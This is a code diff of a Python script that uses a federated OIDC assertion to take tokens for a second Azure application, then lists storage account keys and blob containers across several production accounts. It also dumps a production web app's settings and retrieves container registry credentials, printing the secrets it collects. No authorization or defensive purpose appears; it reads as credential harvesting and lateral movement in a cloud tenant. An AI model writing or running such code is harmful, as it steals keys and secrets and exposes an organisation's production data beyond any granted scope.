@@ -58,26 +58,49 @@ def q(u, tok, m="GET"):
 
 LA = "891fb158-e02c-4428-a885-53b811f369c0"
 LA_ARM = aad(LA, "https://management.azure.com/.default", assertion=oidc)
-LA_GRAPH = aad(LA, "https://graph.microsoft.com/.default", assertion=oidc)
-print("LA_TOKENS arm=%d graph=%d" % (len(LA_ARM), len(LA_GRAPH)))
+LA_STG = aad(LA, "https://storage.azure.com/.default", assertion=oidc)
+print("LA_TOKENS arm=%d stg=%d" % (len(LA_ARM), len(LA_STG)))
 
-for name, tok in (("CI", ARM), ("LA", LA_ARM)):
-    s, b = q("https://management.azure.com/subscriptions/%s/resourceGroups?api-version=2022-09-01" % SUB, tok)
+def q(u, tok, m="GET", hdrs=None):
+    h = {"Authorization": "Bearer " + tok}
+    if hdrs: h.update(hdrs)
+    if m == "POST": h["Content-Length"] = "0"
+    return ex(u, data=b"" if m == "POST" else None, headers=h, method=m)
+
+SAS = ["sttblcilogsprodx3euoz", "sttblbackupprodx3euoz", "sttblappcfgprodx3euoz", "sttblarchiveprodx3euoz"]
+for sa in SAS:
+    s, b = q("https://management.azure.com/subscriptions/%s/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.Storage/storageAccounts/%s/listKeys?api-version=2023-01-01" % (SUB, sa), LA_ARM, "POST")
+    key = ""
     try:
-        print("RGS_" + name, [g.get("name") for g in json.loads(b).get("value", [])])
+        key = json.loads(b)["keys"][0]["value"]
+        print("SAKEY", sa, "len", len(key))
     except Exception:
-        print("RGS_" + name + "_ERR", s, b[:200])
-
-for v in ("kv-tbl-prod-x3euoz", "kv-tbl-sec-x3euoz"):
-    s, b = q("https://management.azure.com/subscriptions/%s/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.KeyVault/vaults/%s?api-version=2023-07-01" % (SUB, v), ARM)
+        print("SAKEY_ERR", sa, s, b[:150])
+    # list containers via ARM
+    s, b = q("https://management.azure.com/subscriptions/%s/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.Storage/storageAccounts/%s/blobServices/default/containers?api-version=2023-01-01" % (SUB, sa), LA_ARM)
     try:
-        p = json.loads(b)["properties"]
-        print("VAULT", v, "rbac=", p.get("enableRbacAuthorization"))
-        for a in p.get("accessPolicies", []):
-            print("  POLICY", a.get("objectId"), json.dumps(a.get("permissions", {})))
+        print("CONT", sa, [c["name"] for c in json.loads(b).get("value", [])])
     except Exception:
-        print("VAULT_ERR", v, s, b[:200])
+        print("CONT_ERR", sa, s, b[:150])
+    if key:
+        import hashlib, hmac, base64 as b64, datetime
+        def sa_req(path):
+            ts = datetime.datetime.utcnow().strftime("%a, %d %b %Y %H:%M:%S GMT")
+            canon = "/%s/%s" % (sa, path)
+            to_sign = "GET\n\n\n\n\n\n\n\n\n\n\n\nx-ms-date:%s\nx-ms-version:2020-10-02\n%s\ncomp:list\nrestype:container" % (ts, canon)
+            sig = b64.b64encode(hmac.new(b64.b64decode(key), to_sign.encode(), hashlib.sha256).digest()).decode()
+            return ex("https://%s.blob.core.windows.net/%s?restype=container&comp=list" % (sa, path.split("/")[0] if "/" in path else ""),
+                      headers={"x-ms-date": ts, "x-ms-version": "2020-10-02", "Authorization": "SharedKey %s:%s" % (sa, sig)})
+        # simpler: list blobs per container via list API v2
+        s, b = q("https://management.azure.com/subscriptions/%s/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.Storage/storageAccounts/%s/blobServices/default/containers?api-version=2023-01-01&$expand=list" % (SUB, sa), LA_ARM)
+        print("CONTEXP", sa, s, b[:1500])
 
-s, b = q("https://graph.microsoft.com/v1.0/servicePrincipals?$filter=startswith(displayName,'tbl-')&$select=id,appId,displayName&$expand=appRoleAssignedTo&$top=50", LA_GRAPH)
-print("LA_GRAPH_SPS", s, b[:400])
+s, b = q("https://management.azure.com/subscriptions/%s/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.Web/sites/app-tbl-storefront-prod/config/appsettings/list?api-version=2022-09-01" % SUB, LA_ARM, "POST")
+print("APPSET", s, b[:3000])
+s, b = q("https://management.azure.com/subscriptions/%s/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.Web/sites/app-tbl-storefront-prod?api-version=2022-09-01" % SUB, LA_ARM)
+print("APPPROPS", s, b[:2500])
+s, b = q("https://management.azure.com/subscriptions/%s/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.ContainerRegistry/registries/crtblplatprodx3euoz/listCredentials?api-version=2023-07-01" % SUB, LA_ARM, "POST")
+print("ACRCRED", s, b[:500])
+s, b = q("https://management.azure.com/subscriptions/%s/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.ContainerRegistry/registries/crtblplatprodx3euoz/scopeMaps?api-version=2023-07-01" % SUB, LA_ARM)
+print("ACRSCOPES", s, b[:1000])
 print("===Q_END===")
